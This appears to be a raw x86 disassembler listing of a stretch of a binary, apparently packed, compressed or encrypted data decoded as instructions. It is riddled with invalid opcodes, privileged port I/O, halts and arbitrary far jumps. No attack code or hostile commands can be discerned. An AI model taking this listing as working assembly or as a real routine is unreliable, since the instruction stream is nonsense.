  41baad:	fimul  DWORD PTR [ebp+0x29]
  41bab0:	aad    0xac
  41bab2:	(bad)  
  41bab4:	fs add al,0xd3
  41bab7:	pop    ds
  41bab8:	jnp    0x41bab9
  41baba:	(bad)  
  41babb:	lds    ebp,FWORD PTR [edx+0x3328a29a]
  41bac1:	outs   dx,BYTE PTR ds:[esi]
  41bac2:	fidivr DWORD PTR [esi-0x2944d2b7]
  41bac8:	(bad)  [edx]
  41baca:	shl    BYTE PTR [ebp+ecx*1+0x5d],0xf9
  41bacf:	jmp    0x17785b3e
  41bad4:	xchg   edx,eax
  41bad5:	or     ah,BYTE PTR [esp+eax*2-0x490ce31]
  41badc:	in     al,0xce
  41bade:	popa   
  41badf:	push   es
  41bae0:	popa   
  41bae1:	push   0x2863e991
  41bae6:	pop    ebp
  41bae7:	aas    
  41bae8:	jge    0x41bb39
  41baea:	fsubp  st(2),st
  41baec:	dec    ebx
  41baed:	sub    ebp,edx
  41baef:	mov    esi,0x755ea6a5
  41baf4:	hlt    
  41baf5:	aad    0xfc
  41baf7:	dec    edi
  41baf8:	inc    esi
  41baf9:	mov    ah,BYTE PTR [ecx]
  41bafb:	ss jle 0x41bafb
  41bafe:	sub    al,0xf5
  41bb00:	arpl   WORD PTR [edx+0x2b],bx
  41bb03:	inc    edx
  41bb04:	inc    edx
  41bb05:	int3   
  41bb06:	xor    BYTE PTR [ebp-0x264db436],0x10
  41bb0d:	aaa    
  41bb0e:	and    al,0x72
  41bb10:	jnp    0x41bb55
  41bb12:	sub    DWORD PTR [ebp+0x31c7281e],edi
  41bb18:	pop    es
  41bb19:	mov    dl,0x86
  41bb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1c:	shr    BYTE PTR [eax+0x2d625f6e],cl
  41bb22:	dec    edx
  41bb23:	xor    BYTE PTR cs:[edx+ebp*1+0x7b],bh
  41bb28:	jge    0x41bb64
  41bb2a:	or     bh,al
  41bb2c:	and    BYTE PTR [edx-0x53],0xe8
  41bb30:	push   es
  41bb31:	fsub   st(6),st
  41bb33:	out    0xb6,eax
  41bb35:	mov    al,al
  41bb37:	rcr    DWORD PTR [edi-0x55],1
  41bb3a:	rcr    DWORD PTR [eax+0x25225b9c],0xdf
  41bb41:	mov    ah,cl
  41bb43:	test   edi,ebx
  41bb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb46:	adc    al,0x89
  41bb48:	or     ah,al
  41bb4a:	popf   
  41bb4b:	stos   DWORD PTR es:[edi],eax
  41bb4c:	adc    esi,ebx
  41bb4e:	call   0xb319:0xffec652a
  41bb55:	sbb    esi,DWORD PTR ss:0x18db7e95
  41bb5c:	pop    esp
  41bb5d:	sbb    edx,edx
  41bb5f:	inc    ecx
  41bb60:	ret    0xe02c
  41bb63:	or     DWORD PTR [ebp-0x5375e107],esp
  41bb69:	dec    ecx
  41bb6a:	dec    esi
  41bb6b:	add    esp,ebx
  41bb6d:	ins    BYTE PTR es:[edi],dx
  41bb6e:	mov    ds:0x11981648,eax
  41bb73:	xchg   esp,eax
  41bb74:	jge    0x41bb92
  41bb76:	shr    dh,1
  41bb78:	xor    dl,0x1c
  41bb7b:	xor    esi,DWORD PTR [edi+0x3d09b23e]
  41bb81:	add    al,0xfb
  41bb83:	jmp    0x905b:0x4e709661
  41bb8a:	inc    edi
  41bb8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb8c:	inc    ecx
  41bb8d:	mov    ch,0x1
  41bb8f:	xor    eax,0xa6eb0b22
  41bb94:	adc    ebp,edi
  41bb96:	push   es
  41bb97:	dec    eax
  41bb98:	ret    0x807b
  41bb9b:	dec    esp
  41bb9c:	mov    ch,0x83
  41bb9e:	push   edx
  41bb9f:	(bad)  
  41bba0:	cld    
  41bba1:	rcl    BYTE PTR [eax-0x7c47fa05],0x4c
  41bba8:	ins    DWORD PTR es:[edi],dx
  41bba9:	fmul   QWORD PTR [edx-0x66]
  41bbac:	inc    edi
  41bbad:	push   ss
  41bbae:	lock daa 
  41bbb0:	imul   edx,DWORD PTR [ecx-0x295178a6],0x868f183b
  41bbba:	add    al,0x50
  41bbbc:	popa   
  41bbbd:	and    al,0xa1
  41bbbf:	xchg   ebx,eax
  41bbc0:	out    dx,al
  41bbc1:	mov    bl,0xbe
  41bbc3:	and    al,0xb5
  41bbc5:	mov    eax,0x92faf63f
  41bbca:	jae    0x41bba5
  41bbcc:	(bad)  
  41bbcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbce:	add    dl,dh
  41bbd0:	iret   
  41bbd1:	dec    esi
  41bbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd3:	leave  
  41bbd4:	push   ds
  41bbd5:	dec    edx
  41bbd6:	adc    al,0x1b
  41bbd8:	mov    dl,0x50
  41bbda:	xor    al,0x8e
  41bbdc:	enter  0x619a,0xb4
  41bbe0:	jb     0x41bb67
  41bbe2:	popf   
  41bbe3:	mov    edi,0x8e71e64a
  41bbe8:	in     eax,dx
  41bbe9:	sub    ch,BYTE PTR [ebp-0x77]
  41bbec:	push   edi
  41bbed:	cmp    eax,0x1d08ddaf
  41bbf2:	rcr    ecx,1
  41bbf4:	add    ch,BYTE PTR [ebx-0x56b3b1fa]
  41bbfa:	int3   
  41bbfb:	pop    es
  41bbfc:	adc    ebp,edi
  41bbfe:	jnp    0x41bbe3
  41bc00:	pop    es
  41bc01:	in     eax,0x6
  41bc03:	cmp    DWORD PTR [ebp+0x4d625397],ebp
  41bc09:	mov    ds:0x4eb75750,al
  41bc0e:	into   
  41bc0f:	cwde   
  41bc10:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc12:	ins    BYTE PTR es:[edi],dx
  41bc13:	jmp    0x3aae:0x9ce5192d
  41bc1a:	mov    cl,0x22
  41bc1c:	xchg   BYTE PTR [edi],dl
  41bc1e:	pop    ebx
  41bc1f:	mov    eax,ds:0x3d70d085
  41bc24:	push   eax
  41bc25:	jecxz  0x41bc30
  41bc27:	jle    0x41bbf1
  41bc29:	test   al,0xc2
  41bc2b:	or     al,0xf8
  41bc2d:	shl    DWORD PTR [ebp-0x5d4638ff],cl
  41bc33:	push   0xffffffa6
  41bc35:	xor    eax,0x2d84bcf
  41bc3a:	sbb    bl,BYTE PTR [edi-0x7f8ed622]
  41bc40:	sub    DWORD PTR [esi],eax
  41bc42:	jge    0x41bc9b
  41bc44:	mov    esi,0x76bfd7de
  41bc49:	pop    ecx
  41bc4a:	xor    ah,BYTE PTR [edx-0x22efa412]
  41bc50:	add    BYTE PTR [edx+edi*2-0x3aa48f67],ah
  41bc57:	imul   esp,ecx,0x27
  41bc5a:	out    dx,al
  41bc5b:	retf   
  41bc5c:	lock aaa 
  41bc5e:	jecxz  0x41bc00
  41bc60:	cmp    bh,BYTE PTR [esi-0x6]
  41bc63:	add    bh,BYTE PTR [ebx+ebx*1+0x6b]
  41bc67:	jge    0x41bcd0
  41bc69:	daa    
  41bc6a:	inc    edx
  41bc6b:	inc    ebp
  41bc6c:	sub    ah,BYTE PTR [ebx+0x6ac738a3]
  41bc72:	ficom  DWORD PTR [ebp+0x9]
  41bc75:	xchg   edx,eax
  41bc76:	adc    eax,0x2a660a9
  41bc7b:	cmp    BYTE PTR es:[edx],0x57
  41bc7f:	rcl    DWORD PTR [edx+edx*1-0x7a8042d8],1
  41bc86:	aaa    
  41bc87:	sub    BYTE PTR [edx],bh
  41bc89:	pop    ebp
  41bc8a:	dec    eax
  41bc8b:	test   BYTE PTR gs:[eax+ebp*2],al
  41bc8f:	retf   0xbb76
  41bc92:	sbb    al,0x52
  41bc94:	in     al,dx
  41bc95:	std    
  41bc96:	in     al,0x30
  41bc98:	dec    eax
  41bc99:	xor    al,0xb4
  41bc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc9c:	(bad)  
  41bc9d:	enter  0x2c02,0x0
  41bca1:	leave  
  41bca2:	push   edi
  41bca3:	lea    ebp,[ebx+0x3c]
  41bca6:	ds jns 0x41bc57
  41bca9:	loopne 0x41bd24
  41bcab:	std    
  41bcac:	(bad)  
  41bcad:	cmp    dl,BYTE PTR [eax]
  41bcaf:	fmul   DWORD PTR [ebp+0x70]
  41bcb2:	add    dh,BYTE PTR [eax-0x15]
  41bcb5:	lahf   
  41bcb6:	sahf   
  41bcb7:	bound  eax,QWORD PTR [eax+0x41]
  41bcba:	dec    edx
  41bcbb:	mov    edi,0xc433185e
  41bcc0:	xor    al,0xd2
  41bcc2:	cmp    edi,DWORD PTR [ebx]
  41bcc4:	inc    ebx
  41bcc5:	fistp  WORD PTR [ecx-0x4b57be6c]
  41bccb:	sti    
  41bccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bccd:	adc    esp,DWORD PTR [esi]
  41bccf:	pop    ebp
  41bcd0:	ret    
  41bcd1:	add    edi,DWORD PTR [eax+0xf]
  41bcd4:	mov    bh,0xa3
  41bcd6:	jnp    0x41bcf1
  41bcd8:	mov    eax,ds:0x504c8182
  41bcdd:	cmp    BYTE PTR [ebp+0x1eff05de],bl
  41bce3:	out    0xb5,eax
  41bce5:	mov    esi,DWORD PTR [eax+0x61]
  41bce8:	outs   dx,BYTE PTR ds:[esi]
  41bce9:	push   ebx
  41bcea:	inc    edx
  41bceb:	ja     0x41bc88
  41bced:	xor    DWORD PTR [edi+0x7b9bd569],0x9417da6e
  41bcf7:	in     al,0xa1
  41bcf9:	push   eax
  41bcfa:	jmp    0xb85261ef
  41bcff:	std    
  41bd00:	mov    edi,0xce846d21
  41bd05:	out    dx,eax
  41bd06:	loopne 0x41bcee
  41bd08:	pop    ss
  41bd09:	rol    BYTE PTR [ebx],cl
  41bd0b:	adc    dh,al
  41bd0d:	xchg   DWORD PTR [ebx+eiz*8],edx
  41bd10:	shl    DWORD PTR [eax-0x3d],cl
  41bd13:	arpl   WORD PTR [edx+0xb],sp
  41bd16:	sti    
  41bd17:	jmp    0x41bd0e
  41bd19:	inc    esi
  41bd1a:	repnz push 0x22
  41bd1d:	xor    ah,BYTE PTR [edi+esi*2-0x6]
  41bd21:	adc    DWORD PTR [edi-0xf5bfee3],ecx
  41bd27:	sbb    ebp,DWORD PTR [esi-0x7edd39df]
  41bd2d:	cld    
  41bd2e:	or     al,0x7d
  41bd30:	push   eax
  41bd31:	mov    ecx,0x17f5f28
  41bd36:	into   
  41bd37:	mov    ah,0x70
  41bd39:	xchg   edx,eax
  41bd3a:	push   ebx
  41bd3b:	imul   edx,DWORD PTR [eax],0xffffff93
  41bd3e:	es jle 0x41bd69
  41bd41:	jge    0x41bcdc
  41bd43:	pop    ss
  41bd44:	dec    esp
  41bd45:	fwait
  41bd46:	or     bh,BYTE PTR [ecx+0x6d5d13ac]
  41bd4c:	add    eax,0xb30b9884
  41bd51:	sbb    eax,0x7bd3cdc5
  41bd56:	test   ebx,esp
  41bd58:	test   BYTE PTR [edi+eax*1],0x46
  41bd5c:	loope  0x41bdb0
  41bd5e:	out    0x47,al
  41bd60:	aad    0x3d
  41bd62:	or     ah,BYTE PTR [eax+0x32afa3b]
  41bd68:	cmp    bl,dh
  41bd6a:	cdq    
  41bd6b:	mov    ebp,0x495f984
  41bd70:	mov    bl,0xa8
  41bd72:	pop    ss
  41bd73:	sbb    al,0x30
  41bd75:	in     eax,0x88
  41bd77:	rcr    BYTE PTR [edi],1
  41bd79:	mov    cl,0x68
  41bd7b:	dec    edi
  41bd7c:	sub    al,0x2f
  41bd7e:	pusha  
  41bd7f:	outs   dx,DWORD PTR ds:[esi]
  41bd80:	ins    DWORD PTR es:[edi],dx
  41bd81:	adc    ch,dl
  41bd83:	jle    0x41bde2
  41bd85:	xor    dl,BYTE PTR [esi-0x74]
  41bd88:	sub    dh,BYTE PTR [ebx+0x1a]
  41bd8b:	mov    ch,0xd5
  41bd8d:	add    eax,0xea22cc66
  41bd92:	pause  
  41bd94:	push   0xa748e667
  41bd99:	dec    edi
  41bd9a:	mov    edx,0x19b7ec3f
  41bd9f:	and    DWORD PTR [ebp-0xd],ecx
  41bda2:	mov    ecx,esi
  41bda4:	lods   al,BYTE PTR ds:[esi]
  41bda5:	cld    
  41bda6:	repnz xor dh,BYTE PTR [ebp+eiz*4+0x10237cdf]
  41bdae:	and    al,ch
  41bdb0:	loop   0x41bd6a
  41bdb2:	push   ebx
  41bdb3:	cwde   
  41bdb4:	popa   
  41bdb5:	xor    BYTE PTR [edx-0x12dd5159],ah
  41bdbb:	push   eax
  41bdbc:	int    0x43
  41bdbe:	aas    
  41bdbf:	jae    0x41be29
  41bdc1:	cld    
  41bdc2:	push   ebx
  41bdc3:	ficomp WORD PTR [eax+esi*8-0x51]
  41bdc7:	sbb    eax,0xc0c9e6d7
  41bdcc:	mov    eax,0xc27d1dc
  41bdd1:	xchg   DWORD PTR [eax-0x33],ebp
  41bdd4:	fcomp  st(3)
  41bdd6:	sub    BYTE PTR [ebx+0x26d03a6e],0x69
  41bddd:	inc    eax
  41bdde:	out    dx,eax
  41bddf:	es jns 0x41bdae
  41bde2:	mov    al,ds:0x372d4c48
  41bde7:	sahf   
  41bde8:	jle    0x41be69
  41bdea:	pop    esp
  41bdeb:	mov    ah,0xd8
  41bded:	or     BYTE PTR [ebp+0x3987bb19],0x8a
  41bdf4:	test   al,0xc1
  41bdf6:	mov    esp,DWORD PTR [edi-0x5db4a847]
  41bdfc:	dec    edx
  41bdfd:	ds sub eax,0x4c045159
  41be03:	or     al,BYTE PTR [edx]
  41be05:	mov    ds:0x1acc2672,eax
  41be0a:	clc    
  41be0b:	push   edi
  41be0c:	xor    eax,0x441640c7
  41be11:	test   BYTE PTR [ebp+0x29061b9d],0x84
  41be18:	mov    al,bl
  41be1a:	or     ch,BYTE PTR [esp+esi*2+0x44]
  41be1e:	dec    esp
  41be1f:	fwait
  41be20:	jmp    0x8ff:0x9e116cf7
  41be27:	scas   eax,DWORD PTR es:[edi]
  41be28:	out    0x9f,al
  41be2a:	add    dl,al
  41be2c:	iret   
  41be2d:	pop    DWORD PTR [eax-0x44e285cc]
  41be33:	cmc    
  41be34:	ds jle 0x41be11
  41be37:	pusha  
  41be38:	inc    edx
  41be39:	or     BYTE PTR [eax],dl
  41be3b:	jg     0x41be76
  41be3d:	push   edi
  41be3e:	adc    BYTE PTR [ebx],al
  41be40:	scas   eax,DWORD PTR es:[edi]
  41be41:	mov    ah,0x5a
  41be43:	sub    al,0xdf
  41be45:	pop    ebp
  41be46:	mov    cl,0xd1
  41be48:	add    ecx,DWORD PTR [esi]
  41be4a:	pop    esi
  41be4b:	cmp    BYTE PTR [ebx-0x26f08653],0xa5
  41be52:	add    ebp,DWORD PTR [edx]
  41be54:	adc    BYTE PTR [edx+0x5],bh
  41be57:	(bad)  
  41be58:	xchg   esi,eax
  41be59:	jmp    0x41be9e
  41be5b:	(bad)  
  41be5c:	out    0x93,eax
  41be5e:	dec    eax
  41be5f:	jnp    0x41be1a
  41be61:	adc    eax,0x12394f56
  41be66:	lea    ebp,[esi-0x16]
  41be69:	retf   0x2955
  41be6c:	mov    ch,0xe6
  41be6e:	retf   0x7db3
  41be71:	js     0x41be82
  41be73:	icebp  
  41be74:	mov    ds:0x93e9018b,eax
  41be79:	das    
  41be7a:	fmul   QWORD PTR [ecx-0x3f23a509]
  41be80:	das    
  41be81:	mov    ds,edx
  41be83:	xchg   edi,eax
  41be84:	aas    
  41be85:	nop
  41be86:	pop    edx
  41be87:	call   0x595aa37e
  41be8c:	test   ah,cl
  41be8e:	lock xchg BYTE PTR [edi-0x6a24c066],bh
  41be95:	xor    BYTE PTR [ecx-0x21],ch
  41be98:	pop    eax
  41be99:	(bad)  
  41be9a:	and    dh,BYTE PTR [edx-0x366fb601]
  41bea0:	(bad)  
  41bea1:	jl     0x41befc
  41bea3:	ins    DWORD PTR es:[edi],dx
  41bea4:	inc    ebx
  41bea5:	xchg   edi,eax
  41bea6:	xchg   ebp,eax
  41bea7:	mov    ebp,0x7de2bd28
  41beac:	add    al,0x60
  41beae:	inc    ebx
  41beaf:	cmp    al,0xf8
  41beb1:	cdq    
  41beb2:	clc    
  41beb3:	mov    ah,0x8e
  41beb5:	retf   0xfd0c
  41beb8:	adc    al,0xd4
  41beba:	(bad)  
  41bebb:	and    DWORD PTR [esi-0x59],ecx
  41bebe:	pop    esp
  41bebf:	imul   ecx,DWORD PTR [esi],0x4284e816
  41bec5:	cmp    BYTE PTR [ebx],bh
  41bec7:	nop
  41bec8:	inc    edx
  41bec9:	push   0x5fcb185
  41bece:	cmp    eax,0xb8be9054
  41bed3:	ds mov eax,0xbce0dc50
  41bed9:	jp     0x41be78
  41bedb:	jmp    0x41bf45
  41bedd:	test   eax,0x385b247a
  41bee2:	xor    eax,DWORD PTR [esi]
  41bee4:	pop    eax
  41bee5:	pop    ebp
  41bee6:	adc    cl,BYTE PTR [edx+0x7b8d6c53]
  41beec:	into   
  41beed:	call   0x2a:0x181e660a
  41bef4:	mov    WORD PTR [esi],ss
  41bef6:	sub    BYTE PTR [ebp-0x79],dl
  41bef9:	pop    esp
  41befa:	retf   0x565e
  41befd:	fdivp  st(3),st
  41beff:	sbb    dh,BYTE PTR [ecx]
  41bf01:	(bad)
  41bf04:	mov    bh,0x64
  41bf06:	xchg   esi,eax
  41bf07:	sub    al,0x3d
  41bf09:	or     BYTE PTR [eax-0x43],0x7b
  41bf0d:	or     eax,0xa80a3643
  41bf12:	fdivr  st(2),st
  41bf14:	sbb    ebx,DWORD PTR [ebx+ebx*8]
  41bf17:	inc    esp
  41bf18:	fimul  WORD PTR [ebx+0x6f308f03]
  41bf1e:	inc    esi
  41bf1f:	or     esi,0xffffffc8
  41bf22:	add    al,0x4c
  41bf24:	add    al,0xad
  41bf26:	xor    al,0x12
  41bf28:	push   ss
  41bf29:	shr    DWORD PTR [esi+esi*2],0x7
  41bf2d:	addr16 (bad) 
  41bf2f:	mov    eax,0xfa33adf2
  41bf34:	push   edi
  41bf35:	mov    ds:0x70d7c59b,al
  41bf3a:	mov    ebx,0x86e7099d
  41bf3f:	xor    DWORD PTR [edx-0x5e],ebx
  41bf42:	imul   ebx,DWORD PTR [ebx],0xc7e809d5
  41bf48:	xchg   edi,eax
  41bf4a:	sbb    BYTE PTR [ebp+0x3dba87d],0x2f
  41bf51:	inc    edx
  41bf52:	cmp    DWORD PTR [ebx+0x7a],esi
  41bf55:	push   ecx
  41bf56:	sub    al,0x2d
  41bf58:	or     eax,DWORD PTR [eax]
  41bf5a:	or     ecx,DWORD PTR [ebx-0x23]
  41bf5d:	mov    edx,0x10201025
  41bf62:	bnd js 0x41bf3f
  41bf65:	(bad)  
  41bf66:	stc    
  41bf67:	addr16 out dx,al
  41bf69:	jne    0x41bfb7
  41bf6b:	adc    esi,DWORD PTR [esi+0x3]
  41bf6e:	mov    cl,0x34
  41bf70:	dec    edi
  41bf71:	pop    eax
  41bf72:	stos   DWORD PTR es:[edi],eax
  41bf73:	sub    al,0x18
  41bf75:	imul   edx,DWORD PTR [esi],0x55a281fe
  41bf7b:	cmp    dh,ch
  41bf7d:	fstp   TBYTE PTR [ecx-0xd]
  41bf80:	pop    ecx
  41bf81:	adc    BYTE PTR [edx],0x9d
  41bf84:	xor    dl,BYTE PTR [esi-0x58]
  41bf87:	jb     0x41bf12
  41bf89:	cmp    eax,0x62a98d1f
  41bf8e:	dec    edi
  41bf8f:	pop    esi
  41bf90:	jnp    0x41bf81
  41bf92:	and    BYTE PTR [esi],0x88
  41bf95:	and    eax,0xb6aa495c
  41bf9a:	mov    esi,0x22cfa5b1
  41bf9f:	add    BYTE PTR [edx+0x28],al
  41bfa2:	nop
  41bfa3:	jne    0x41c01f
  41bfa5:	loop   0x41c006
  41bfa7:	or     DWORD PTR [edx+0x2d74efe0],ebp
  41bfad:	leave  
  41bfae:	(bad)  
  41bfaf:	pop    edi
  41bfb0:	add    ecx,DWORD PTR [edx-0x4b]
  41bfb3:	mov    edi,0x7cd44243
  41bfb8:	das    
  41bfb9:	jo     0x41bf81
  41bfbb:	inc    ebp
  41bfbc:	adc    ebp,DWORD PTR [ebp+ecx*8+0xa]
  41bfc0:	loopne 0x41bf4c
  41bfc2:	je     0x41bf8e
  41bfc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfc5:	push   esp
  41bfc6:	(bad)  
  41bfc8:	aaa    
  41bfc9:	imul   BYTE PTR [edi+0x53459d2f]
  41bfcf:	scas   al,BYTE PTR es:[edi]
  41bfd0:	pop    eax
  41bfd1:	inc    eax
  41bfd2:	mov    dh,0x48
  41bfd4:	test   DWORD PTR [edx],ebp
  41bfd6:	sete   BYTE PTR [edx+eax*1-0x219993ee]
  41bfde:	jo     0x41bf78
  41bfe0:	pop    eax
  41bfe1:	repz cmp DWORD PTR [ebx-0x55a9bcec],ecx
  41bfe8:	mov    DWORD PTR [esi-0x33c8eb98],esp
  41bfee:	dec    esi
  41bfef:	test   eax,0x9f9781a2
  41bff4:	mov    esi,0xe216f58f
  41bff9:	jp     0x41bfa9
  41bffb:	imul   esp,DWORD PTR ds:0xc185d386,0xfffffff2
  41c002:	hlt    
  41c003:	fdiv   QWORD PTR [edx+0x7756a552]
  41c009:	fistp  QWORD PTR [ecx+0x4e8107f6]
  41c00f:	mov    al,0xa0
  41c011:	xchg   edi,eax
  41c012:	add    edx,DWORD PTR [edi-0x32d12563]
  41c018:	les    edi,FWORD PTR [ebx]
  41c01a:	xchg   edx,eax
  41c01b:	inc    ebp
  41c01c:	rcl    DWORD PTR [edx+esi*4+0x11],0xca
  41c021:	xchg   esp,eax
  41c022:	and    cl,0x78
  41c025:	test   edx,0xc0569bec
  41c02b:	ficom  DWORD PTR [eax+0x40be2e6]
  41c031:	or     al,BYTE PTR [ecx-0x39fe905b]
  41c037:	retf   0xd198
  41c03a:	in     al,0xd0
  41c03c:	mov    al,ds:0xfeb17131
  41c041:	ficom  WORD PTR [ebx+ebp*2+0x59]
  41c045:	clc    
  41c046:	inc    ebp
  41c047:	test   BYTE PTR [ecx],cl
  41c049:	xor    ebp,DWORD PTR [eax-0x20604ac3]
  41c04f:	dec    ebx
  41c050:	inc    edx
  41c051:	fdivr  st(3),st
  41c053:	fs inc edx
  41c055:	xor    DWORD PTR [ecx+0x2e2d957e],esp
  41c05b:	push   ecx
  41c05c:	cwde   
  41c05d:	icebp  
  41c05e:	mov    bh,0x10
  41c060:	cmp    DWORD PTR [edi-0x11],eax
  41c063:	cli    
  41c064:	sbb    cl,bh
  41c066:	(bad)  
  41c067:	push   edx
  41c068:	in     eax,dx
  41c069:	mov    eax,0x52c7c319
  41c06e:	jge    0x41c0da
  41c070:	mov    bh,0xa9
  41c072:	in     al,dx
  41c073:	pop    ds
  41c074:	mov    edi,0x177570cf
  41c079:	(bad)  
  41c07a:	aas    
  41c07b:	jge    0x41c0b2
  41c07d:	pop    edi
  41c07e:	and    ecx,0xffffffdd
  41c081:	out    0x6f,eax
  41c083:	ret    
  41c084:	popf   
  41c085:	inc    edx
  41c086:	or     esi,DWORD PTR ds:0xa661ecc
  41c08c:	add    esp,esp
  41c08e:	imul   DWORD PTR [eax+edi*8+0x5b]
  41c092:	ss sbb al,0xbe
  41c095:	xlat   BYTE PTR ds:[ebx]
  41c096:	pop    edi
  41c097:	push   esi
  41c098:	mov    cl,BYTE PTR cs:[ebp+0x57144078]
  41c09f:	mov    ds:0x2279b2d8,eax
  41c0a4:	jno    0x41c0f0
  41c0a6:	(bad)  
  41c0a7:	xor    al,0x35
  41c0a9:	mov    ds:0x432d0897,al
  41c0ae:	pusha  
  41c0af:	cmp    eax,0xaea2086e
  41c0b4:	and    edi,DWORD PTR [eax-0x755dcbe6]
  41c0ba:	int3   
  41c0bb:	or     al,0xe7
  41c0bd:	xor    esp,ebx
  41c0bf:	std    
  41c0c0:	aad    0x79
  41c0c2:	xchg   ebx,eax
  41c0c3:	int3   
  41c0c4:	mov    al,ds:0x1b3d2a34
  41c0c9:	xlat   BYTE PTR ds:[ebx]
  41c0ca:	int3   
  41c0cb:	push   edx
  41c0cc:	jmp    0xf9f5:0x9f1e8e3d
  41c0d3:	in     eax,0x7
  41c0d5:	out    dx,al
  41c0d6:	xor    al,0x26
  41c0d8:	sub    ah,BYTE PTR [ebx+0xc]
  41c0db:	les    edx,FWORD PTR [ebp+esi*1+0x3478248b]
  41c0e2:	jns    0x41c153
  41c0e4:	lea    edi,[eax+0x719240d9]
  41c0ea:	stos   BYTE PTR es:[edi],al
  41c0eb:	add    al,0xc2
  41c0ed:	jae    0x41c123
  41c0ef:	xor    BYTE PTR [ebx],cl
  41c0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f3:	mov    gs,WORD PTR [ebx-0x4b]
  41c0f6:	jb     0x41c151
  41c0f8:	pop    ss
  41c0f9:	and    DWORD PTR [esi],eax
  41c0fb:	mov    ds:0x357ffede,al
  41c100:	add    bl,BYTE PTR [edx+0x29da9e1f]
  41c106:	cmc    
  41c107:	gs dec edx
  41c109:	mov    ds:0x5b87d1a7,eax
  41c10e:	mov    ch,0xd5
  41c110:	mov    dl,0x9c
  41c112:	in     eax,dx
  41c113:	in     eax,0xa2
  41c115:	daa    
  41c116:	mov    ebx,0xd40c5af3
  41c11b:	adc    eax,0x3e6e0038
  41c120:	inc    ebx
  41c121:	jp     0x41c138
  41c123:	retf   0xed9b
  41c126:	mov    dh,0x44
  41c128:	mov    dl,0xa2
  41c12a:	ins    DWORD PTR es:[edi],dx
  41c12b:	je     0x41c0e0
  41c12d:	lods   eax,DWORD PTR ds:[esi]
  41c12e:	sti    
  41c12f:	push   ebp
  41c130:	(bad)
  41c136:	jae    0x41c13d
  41c138:	fisttp WORD PTR [edx+0x5b581e76]
  41c13e:	mov    al,ds:0x679383c0
  41c143:	or     ebp,ecx
  41c145:	xchg   DWORD PTR [ecx],ebp
  41c147:	lds    ecx,FWORD PTR [eax+0x60]
  41c14a:	into   
  41c14b:	push   edx
  41c14c:	mov    esi,0xb72a0046
  41c151:	(bad)  
  41c152:	scas   al,BYTE PTR es:[edi]
  41c153:	bound  eax,QWORD PTR [edx+0x4112b9fd]
  41c159:	fidiv  WORD PTR [ecx]
  41c15b:	inc    esp
  41c15c:	mov    edi,DWORD PTR [ebx]
  41c15e:	into   
  41c15f:	jno    0x41c0fd
  41c161:	(bad)  
  41c162:	ds enter 0x382b,0xee
  41c167:	in     al,0x7
  41c169:	hlt    
  41c16a:	xor    ecx,DWORD PTR [esi+edi*4]
  41c16d:	out    0x81,eax
  41c16f:	hlt    
  41c170:	mov    ecx,DWORD PTR [ebx-0x2ec838f7]
  41c176:	adc    al,0xd3
  41c178:	push   0x78
  41c17a:	es mov ebp,0x8c607c08
  41c180:	mov    edx,0xfacaf6e4
  41c185:	push   ss
  41c186:	pop    edi
  41c187:	adc    BYTE PTR cs:[edi+0x0],dl
  41c18b:	cli    
  41c18c:	cli    
  41c18d:	mov    ah,0x63
  41c18f:	xlat   BYTE PTR ds:[ebx]
  41c190:	out    0xef,al
  41c192:	out    0x6e,eax
  41c194:	dec    edx
  41c195:	add    al,ah
  41c197:	xor    BYTE PTR [edi+eax*2],ch
  41c19a:	div    al
  41c19c:	push   ss
  41c19d:	sbb    ebx,DWORD PTR [edi-0xafa92e3]
  41c1a3:	mov    bh,0xaf
  41c1a5:	jmp    0x41c1f3
  41c1a7:	test   DWORD PTR [ebp+0x4761ce00],ebp
  41c1ad:	sti    
  41c1ae:	clc    
  41c1af:	inc    ebx
  41c1b0:	mov    edi,0x2a5d8e1c
  41c1b5:	jb     0x41c182
  41c1b7:	mov    ah,BYTE PTR [esi-0x3d8a4257]
  41c1bd:	fxch   st(1)
  41c1bf:	pop    esp
  41c1c0:	pushf  
  41c1c1:	mov    edx,0x945784ae
  41c1c6:	inc    eax
  41c1c7:	ret    0xb118
  41c1ca:	retf   
  41c1cb:	ins    BYTE PTR es:[di],dx
  41c1cd:	aas    
  41c1ce:	sub    BYTE PTR [esi-0x14],0xe3
  41c1d2:	rcr    BYTE PTR [esi+eax*4],0xf0
  41c1d6:	ficom  DWORD PTR [ecx+0x3c]
  41c1d9:	cmp    bl,BYTE PTR [ebx]
  41c1db:	mov    dl,0x1c
  41c1dd:	xchg   ecx,eax
  41c1de:	jecxz  0x41c25f
  41c1e0:	adc    DWORD PTR [eax],eax
  41c1e2:	and    eax,0x6feb7d37
  41c1e7:	bound  ecx,QWORD PTR [ebx]
  41c1e9:	out    0x15,al
  41c1eb:	xchg   esi,eax
  41c1ec:	or     ch,dh
  41c1ee:	loopne 0x41c23a
  41c1f0:	sub    al,0xc3
  41c1f2:	mov    ebx,0x83ed0908
  41c1f7:	stc    
  41c1f8:	mov    esp,esp
  41c1fa:	ds pop esp
  41c1fc:	fs jmp 0x41c1f3
  41c1ff:	dec    edi
  41c200:	add    BYTE PTR ds:0x1d5bcad5,ah
  41c206:	jno    0x41c260
  41c208:	lds    ecx,FWORD PTR [esi-0x30019896]
  41c20e:	ins    DWORD PTR es:[edi],dx
  41c20f:	std    
  41c210:	loop   0x41c1c2
  41c212:	sub    eax,0x3e2bda00
  41c217:	mov    BYTE PTR [edx-0x4994cb9d],dh
  41c21d:	xor    al,BYTE PTR [eax+0x6b1ba97b]
  41c223:	ror    DWORD PTR [eax],0xd0
  41c226:	push   0xabfbe935
  41c22b:	fnstenv [edx+0x3b]
  41c22e:	pop    esp
  41c22f:	in     eax,0x78
  41c231:	lahf   
  41c232:	xlat   BYTE PTR ds:[ebx]
  41c233:	mov    ebp,0x5c89628f
  41c238:	pop    ebx
  41c239:	(bad)  
